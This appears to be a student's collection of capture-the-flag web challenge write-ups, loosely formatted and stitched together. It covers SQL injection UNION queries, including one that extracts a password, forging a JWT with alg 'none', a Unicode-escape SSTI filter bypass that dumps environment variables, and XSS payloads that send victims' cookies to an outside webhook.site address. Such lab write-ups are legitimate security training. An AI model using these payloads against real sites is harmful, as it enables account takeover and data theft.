## Flag:
```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Approach:
Used various queries out of which mentioned below worked:
- ```  ' OR '1'='1' --  ```
- ```  ' OR department='Management' --  ```
- ```  Kiwi' AND department='Management' --  ```
- ```  ' UNION SELECT * FROM metadata --  ```
- ```  ' UNION SELECT secrets, NULL, NULL, NULL FROM CITADEL_ARCHIVE_2077 --  ```


## Concepts Learned:
- Got to learn about sql injection queries, extracting data from tables.

## Wrong Tangents:
- Tried several wrong queries and blindly performing injections.

```

## Approach:
- Opened Developer's Tool, looked for it's cookie-token.
- Opened ``` jwt.io ``` website, pasted it in the website, got Header, Payloads and Signature shown below.
- It was a ``` Symmetric key ``` algorithm.
- Changed alg to ``` none ```, removed the signature part.

- Modified ``` exp : 0 ``` to ``` exp : 1767193756 ``` to make it unexpired.
- Used ``` Epoch Time Converter ``` to get exp Timestrap.

- Encoded it using Base64 and put the token value in the token in Develops tools.
- Got the Flag after refreshing the page.

## Resources:
- Base64 Encoder
- jwt.io

## Flag:
```
nite{are_you_feeling_the_heat_now :)}
```

## Approach:
- Opened the website, in it we get only one chance to run a query and to guess the password.
- Each new session starts with a new table id.

  <img width="644" height="232" alt="Screenshot 2025-12-06 013340" src="https://github.com/user-attachments/assets/3b2970de-d7a8-4978-b339-f0f220f3d449" />
  

- A correct query gives a ``` 32 character ```  masked password which would give the flag.

  <img width="639" height="375" alt="Screenshot 2025-12-06 002254" src="https://github.com/user-attachments/assets/44f3e4e1-1181-4c0e-9c05-6129bbb384a5" />
  

- So, searched and executed this query to get that 32 charactered password unmasked.

```
' AND 0 UNION ALL SELECT substr(password,1,1) FROM table_327e5c25ab8a19a2
```
- Run this query 32 times in combination to extarct the password from the password table.
- Therefore complete query looks like:
  
```
  ' AND 0 UNION ALL SELECT substr(password,1,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,2,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,3,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,4,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,5,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,6,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,7,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,8,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,9,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,10,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,11,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,12,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,13,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,14,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,15,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,16,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,17,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,18,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,19,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,20,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,21,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,22,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,23,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,24,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,25,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,26,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,27,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,28,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,29,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,30,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,31,1) FROM table_327e5c25ab8a19a2  UNION ALL SELECT substr(password,32,1) FROM table_327e5c25ab8a19a2  --
```
- Got an unordered list of 32 characters whichh came out to be the password.

- Entered those characters in the guess box and got the flag.

## Concepts Learned:
- SQL injection

## Wrong Tangents:
- At first I didn't know that in every new session table id is getting changed.
- Was trying different queries again and again and it was of no use beacause each time table is different.

## FLag:

nite{s5t1_w17h_un1c0d3_35c4p3_byp455}
```

## Approach:
- First accessed http://localhost:1234 locally on my machine.
- Logined by clicking on ``` Register Here ``` and typing any login credentials.
- There came a review adding website.

- I got to know that we need to perform SSTI injection into this review box to reveal the flag.
- I tried some ``` ${7=7) ```, this injections added the below review ``` Best coffee I had ```.

 <img width="1496" height="137" alt="Screenshot 2025-12-07 015106" src="https://github.com/user-attachments/assets/d1d8b9f0-7aea-4e2a-be8e-4f53298de784" />

- Studied the code from ``` app.py ``` script noticed that it decodes the escape sequences as ``` review = ( bytes(review, "utf-8").decode("unicode_escape") ) ```
- So I replaced ``` $ ``` with ``` \N{DOLLAR SIGN} ``` and tried injecting using ``` \N{DOLLAR SIGN}{7*7} ```.
  > 49 was added as a review.
- I got a SSTI payload ``` ${cycler._init.globals_.os.environ} ``` which I replaced with ``` \N{DOLLAR SIGN}{cycler._init.globals_.os.environ} ``` and got the useful metadat.

- After this, I opened the actual challenge site andd applied the same the got the flag.

## Concepts Learned:
- Unicode SSTI injection attack

```

## Approach:
- In this challenge, first I read about what is an XSS injection, I got a little idea that it's about injecting our malicious code into a website link so that an attacker can steal the sensitive information from the user when he/she clicks on the link.
- But not getting how to proceed with the challenge.
- I used a little bit gpt for it.
- It suggested me to use  [Web](https://Webhook.site)   and got a query to steal cookies from the bot.

  <img width="1388" height="547" alt="Screenshot 2025-12-06 200746" src="https://github.com/user-attachments/assets/ab8406f1-3740-4e9a-a128-7d69c0df9131" />

 > Query looked like:
  
  ```
  <script>window.location='https://webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+document.cookie</script>
  ```

- Pasted this query in the ``` XSS ME 1 ``` and sent it to the payload.
- Got a cookie as ``` c = xss2=/bf2a73106a3aa48bab9b8b47e4bd350e ``` in [Web](https://Webhook.site)

  <img width="1915" height="941" alt="Screenshot 2025-12-06 215038" src="https://github.com/user-attachments/assets/cdb10c8b-1f8e-4f74-a790-fdce8a36892c" />

- Pasted the the end part of this response to the URL of the challenge site.
- In ``` XSS ME 2 ```, repeated the same procedure with the below payload

  <img width="1283" height="526" alt="Screenshot 2025-12-06 222002" src="https://github.com/user-attachments/assets/1865b33c-22ba-4eff-a195-1693a36c6cc0" />

  ```
  <script>window.location='	https://webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+document.cookie</script>
  ```

- Got another cookie as ``` c = xss3=/3e79c8a64bd10f5fa897b7832384f043 ``` in [Web](https://Webhook.site)

  <img width="1917" height="862" alt="image" src="https://github.com/user-attachments/assets/be9b2c68-d5cd-4fbf-86b3-a938fd688791" />

- Pasted the the end part of this response to the URL of the challenge site.
- In ``` XSS ME 3 ```, entered the below payload

  <img width="1362" height="574" alt="Screenshot 2025-12-06 221753" src="https://github.com/user-attachments/assets/5c1ee555-ceef-4386-835f-809a5eb602a9" />

  ```
  <body onload="window.location='//webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+window['doc'+'ument']['coo'+'kie']">
  ```

- Got the flag in [Web](https://Webhook.site) as a cookie.
